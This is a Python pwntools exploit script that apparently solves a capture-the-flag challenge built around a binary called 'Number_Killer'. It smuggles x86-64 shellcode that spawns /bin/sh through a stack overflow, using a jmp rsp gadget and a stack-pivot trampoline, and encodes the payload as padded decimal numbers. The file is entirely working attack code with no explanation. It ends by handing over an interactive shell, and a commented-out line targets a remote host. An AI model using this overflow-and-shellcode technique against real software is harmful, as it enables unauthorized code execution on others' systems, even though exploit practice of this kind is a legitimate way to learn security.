
from pwn import *
context(arch = 'amd64', os = 'linux')

sh = process("./Number_Killer")
#sh = remote("47.103.214.163", 20001)
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
#gdb.attach(sh)
def reverse(data):
	res = ''
	for i in range(len(data)-1, -1, -2):
		res += data[i-1:i+1]
	return res

sub_rsp_jmp = asm("sub rsp,0x70;jmp rsp")
jmp_rsp = 0x40078D
target = shellcode + 'a'*(92-len(shellcode)) + p32(11) + 'a' * 8 + p64(jmp_rsp) + sub_rsp_jmp
payload = ''
i = 0
while i < len(target) - (len(target)%8):
	res = ''
	for j in range(8):
		res += "%02x" % ord(target[i+j])
	i += 8
	payload += str(int(reverse(res), 16)).rjust(19, '0') + '\n'
res = ''
for j in range(6):
	res += "%02x" % ord(target[i+j])
res = res.ljust(16, '0')
payload += str(int(reverse(res), 16)).rjust(19, '0') + '\n'
while len(payload) < 19 * 20:
	payload += '1'*19 + '\n'
sh.sendline(payload)
sh.interactive()
